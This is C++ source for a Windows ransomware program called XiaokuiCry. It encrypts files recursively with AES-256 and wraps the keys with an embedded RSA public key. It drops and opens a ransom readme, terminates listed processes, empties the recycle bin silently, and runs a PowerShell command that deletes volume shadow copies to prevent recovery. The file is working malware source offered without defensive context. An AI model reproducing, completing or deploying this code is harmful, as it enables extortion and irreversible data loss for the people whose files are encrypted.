#include "XiaokuiCry.h"
#include "resource.h"
#include <iostream>  
#include <fstream>
#include <shellapi.h>
#include <shlobj.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/bio.h>
#include "tlhelp32.h"
#include <WinUser.h>

#define AES_BLOCK_SIZE 16
#define KEY_SIZE 32 // AES-256  
#define READ_SIZE 1024

#define KEY_LENGTH 2048

XiaokuiCry::XiaokuiCry() {
    m_root_dir_list.push_back(L"D:\\XiaokuiCry");
    m_rsa_pub_key = RSA_new();
}

XiaokuiCry::~XiaokuiCry() {
    m_root_dir_list.clear();
    m_processes_need.clear();
    m_root_dir_list.clear();
    m_suffix_ignore.clear();
    m_ip_list.clear();
    RSA_free(m_rsa_pub_key);
}

bool XiaokuiCry::generate_key(unsigned char* key, int key_size) {
    if (RAND_bytes(key, key_size) != 1) {
        std::cerr << "Error generating random bytes for AES key." << std::endl;
        return false;
    }
    return true;
}

void XiaokuiCry::get_rsa_pub_key() {
    HMODULE instance = ::GetModuleHandle(NULL);
    HRSRC res_id = ::FindResource(instance, MAKEINTRESOURCE(IDR_RESTXT2), L"RESTXT");
    if (res_id == NULL) {
        int ierr = GetLastError();
        return;
    }
    LPVOID res = ::LockResource(::LoadResource(instance, res_id));
    if (res == NULL) {
        return;
    }

    DWORD res_size = ::SizeofResource(instance, res_id);
    std::string pem_string = std::string((char*)res, res_size);

    BIO* bio = BIO_new(BIO_s_mem());
    BIO_write(bio, pem_string.c_str(), pem_string.length());
    PEM_read_bio_RSA_PUBKEY(bio, &m_rsa_pub_key, NULL, NULL);
    BIO_free_all(bio);
    return;
}

std::string XiaokuiCry::encrypt_aes_key(unsigned char* key, int key_size) {
    std::string encrypt_key;
    int len = RSA_size(m_rsa_pub_key);
    unsigned char* text = new unsigned char[len + 1];
    memset(text, 0, len + 1);

    int ret = RSA_public_encrypt(key_size, key, text, m_rsa_pub_key, RSA_PKCS1_PADDING);
    if (ret >= 0) {
        encrypt_key = std::string(reinterpret_cast<char*>(text), ret);
    }
    free(text);
    return encrypt_key;
}

void XiaokuiCry::encrypt_file(const std::string& input_file) {
    const std::string outputFile = input_file + m_suffix;
    std::ifstream ifs(input_file, std::ios::binary);
    std::ofstream ofs(outputFile, std::ios::binary);
    unsigned char key[KEY_SIZE] = { 0 };
    int key_len = sizeof(key);
    if (!generate_key(key, key_len)) {
        return;
    }

    if (!ifs.is_open() || !ofs.is_open()) {
        std::cerr << "Failed to open file!" << std::endl;
        return;
    }

    // 读取文件内容到vector  
    std::vector<unsigned char> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());

    // 初始化AES上下文（这里以AES-256-CBC为例）  
    AES_KEY aes_key;
    if (key_len != 32) { // AES-256需要32字节的key  
        std::cerr << "Invalid key length!" << std::endl;
        return;
    }
    AES_set_encrypt_key(key, 256, &aes_key);

    // 初始化向量（IV）  
    unsigned char iv[AES_BLOCK_SIZE];
    if (!RAND_bytes(iv, AES_BLOCK_SIZE)) {
        std::cerr << "Failed to generate IV!" << std::endl;
        return;
    }

    // 加密并写入到文件  
    std::vector<unsigned char> ciphertext(data.size() + AES_BLOCK_SIZE + key_len + 1); // 需要为填充留出空间  
    AES_cbc_encrypt(data.data(), ciphertext.data(), data.size(), &aes_key, iv, AES_ENCRYPT);

    // 写入IV到文件 (在实际应用中，IV通常是与密文一起传输的)
    std::string encrypt_key = encrypt_aes_key(key, key_len);
    if (encrypt_key.length() > 0) {
        ofs.write("0", 1);
        ofs.write(encrypt_key.c_str(), encrypt_key.length());
    }
    else {
        ofs.write("1", 1);
        ofs.write(reinterpret_cast<char*>(key), key_len);
    }
    
    ofs.write(reinterpret_cast<char*>(iv), AES_BLOCK_SIZE);

    // 写入密文到文件  
    ofs.write(reinterpret_cast<char*>(ciphertext.data()), ciphertext.size());

    ifs.close();
    ofs.close();
    std::cout << "Encrypt file: " << input_file << std::endl;
    std::cout << "------------------------------------------------------------------------------------" << std::endl;
}

std::string XiaokuiCry::wstring_to_string(std::wstring wstr) {
    std::string result;
    //获取缓冲区大小，并申请空间，缓冲区大小事按字节计算的  
    int len = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), NULL, 0, NULL, NULL);
    char* buffer = new char[len + 1];
    //宽字节编码转换成多字节编码  
    WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), buffer, len, NULL, NULL);
    buffer[len] = '\0';
    //删除缓冲区并返回值  
    result.append(buffer);
    delete[] buffer;
    return result;
}

std::string XiaokuiCry::get_file_suffix(std::string filename) {
    size_t dot = filename.find_last_of(".");
    std::string suffix = "";
    if (0 < dot && dot < filename.length() - 1) {
        suffix = filename.substr(dot + 1, filename.length() - dot - 1);
    }
    return suffix;
}

void XiaokuiCry::enumerate_files_and_folders(const std::wstring& path, bool isRecursive = true) {
    HANDLE hFind;
    WIN32_FIND_DATA ffd;

    std::wstring searchPath = path + (path.back() == L'\\' ? L"*" : L"\\*");

    hFind = FindFirstFileEx(searchPath.c_str(), FINDEX_INFO_LEVELS::FindExInfoStandard, &ffd, FindExSearchNameMatch, NULL, 0);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            // 跳过'.'和'..'  
            if (wcscmp(ffd.cFileName, L".") != 0 && wcscmp(ffd.cFileName, L"..") != 0) {
                std::wcout << ffd.cFileName << (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ? L" [directory]" : L"") << std::endl;

                // 如果是目录且需要递归遍历  
                if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && isRecursive) {
                    std::wstring newPath = path + L"\\" + ffd.cFileName;
                    enumerate_files_and_folders(newPath, isRecursive);
                } else {
                    std::string file_name_str = wstring_to_string(ffd.cFileName);
                    std::string file_suffix = get_file_suffix(file_name_str);
                    for (auto suffix_iter = m_suffix_ignore.begin(); suffix_iter != m_suffix_ignore.end(); suffix_iter++) {
                        if (!file_suffix.compare(*suffix_iter)) {
                            continue;
                        }
                    }
                    encrypt_file(wstring_to_string(path) + "\\" + file_name_str);
                }
            }
            export_readme_file((path + L"\\" + m_readme));
        } while (FindNextFile(hFind, &ffd));

        FindClose(hFind);
    }
}

bool XiaokuiCry::export_readme_file(std::wstring file_path) {
    HMODULE instance = ::GetModuleHandle(NULL);
    HRSRC res_id = ::FindResource(instance, MAKEINTRESOURCE(IDR_HTML1), RT_HTML);
    if (res_id == NULL) {
        int ierr = GetLastError();
        return false;;
    }
    LPVOID res = ::LockResource(::LoadResource(instance, res_id));
    if (res == NULL) {
        return false;
    }

    DWORD res_size = ::SizeofResource(instance, res_id);
    HANDLE res_file = CreateFile(file_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (res_file == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD written = 0;
    WriteFile(res_file, res, res_size, &written, NULL);
    CloseHandle(res_file);
    return true;
}

void XiaokuiCry::open_readme() {
    TCHAR desktop_path[MAX_PATH];
    if (FAILED(SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path))) {
        return;
    }
    
    std::wstring readme_file = desktop_path;
    readme_file += L"\\" + m_readme;
    if (!export_readme_file(readme_file)) {
        return;
    }

    ShellExecute(NULL, L"open", readme_file.c_str(), NULL, NULL, SW_SHOWNORMAL);
}

void XiaokuiCry::kill_processes() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return;
    }
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &pe32)) {
        do {
            std::string exe_file = wstring_to_string(pe32.szExeFile);
            for (auto iter = m_processes_need.begin(); iter != m_processes_need.end(); iter++) {
                if (exe_file.compare(*iter)) {
                    continue;
                }
                DWORD pid_to_kill = pe32.th32ProcessID;
                HANDLE process_handle = OpenProcess(PROCESS_TERMINATE, FALSE, pid_to_kill);
                if (process_handle == NULL) {
                    continue;
                }
                TerminateProcess(process_handle, 0);
                std::cout << "Terminate Process: " << exe_file << std::endl;
                CloseHandle(process_handle);
            }
        } while (Process32Next(snapshot, &pe32));
    }
}

void XiaokuiCry::cry() {
    kill_processes();
    get_rsa_pub_key();
    for (auto iter = m_root_dir_list.begin(); iter != m_root_dir_list.end(); iter++) {
        enumerate_files_and_folders(*iter);
    }
    open_readme();

    SHEmptyRecycleBin(NULL, NULL, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);

    std::wstring shell_command = L"powershell -ep bypass -c \"Get-WmiObject Win32_ShadowCopy| Remove-WmiObject\"";
    ShellExecute(NULL, L"open", shell_command.c_str(), NULL, NULL, SW_SHOWNORMAL);
    
}